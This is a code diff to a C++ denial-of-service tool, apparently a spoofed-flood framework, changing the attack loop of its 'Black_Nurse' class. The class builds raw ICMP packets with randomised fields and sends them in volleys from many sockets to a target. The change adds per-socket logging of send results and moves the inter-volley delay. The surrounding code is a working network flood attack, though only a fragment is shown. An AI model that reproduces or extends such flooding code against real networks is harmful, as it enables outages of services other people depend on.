@@ -14,6 +14,7 @@ Black_Nurse::Black_Nurse(const config *conf, Logger *logger) : Spoofed_Flood(con
 }
 
 void Black_Nurse::attack(const int *id) {
+    int r;
     char buf[400];
     std::vector<int> sockets;
     for (int x = 0; x < conf->CONNECTIONS; x++) {
@@ -64,13 +65,19 @@ void Black_Nurse::attack(const int *id) {
             icmp->un.echo.sequence = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
             icmp->un.echo.id = static_cast<u_int16_t>(Randomizer::randomInt(1, 1000));
             icmp->checksum = htons(csum((unsigned short *) buf, (sizeof(struct ip) + sizeof(struct icmphdr))));
-            if(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)) == -1){
+            if((r = static_cast<int>(sendto(sockets[x], buf, sizeof(buf), 0, (struct sockaddr *)&dst, sizeof(dst)))) == -1){
                 close(sockets[x]);
                 sockets[x] = make_socket(IPPROTO_ICMP);
+            }else{
+                message = std::string("Socket[") + std::to_string(x) + "->"
+                          + std::to_string(sockets[x]) + "] -> " + std::to_string(r);
+                logger->Log(&message, Logger::Info);
+                message = std::to_string(*id) + ": Voly Sent";
+                logger->Log(&message, Logger::Info);
             }
+            message = std::to_string(*id) + ": Voly Sent";
+            logger->Log(&message, Logger::Info);
+            usleep(static_cast<__useconds_t>(conf->delay));
         }
-        message = std::to_string(*id) + ": Voly Sent";
-        logger->Log(&message, Logger::Info);
-        usleep(static_cast<__useconds_t>(conf->delay));
     }
 }
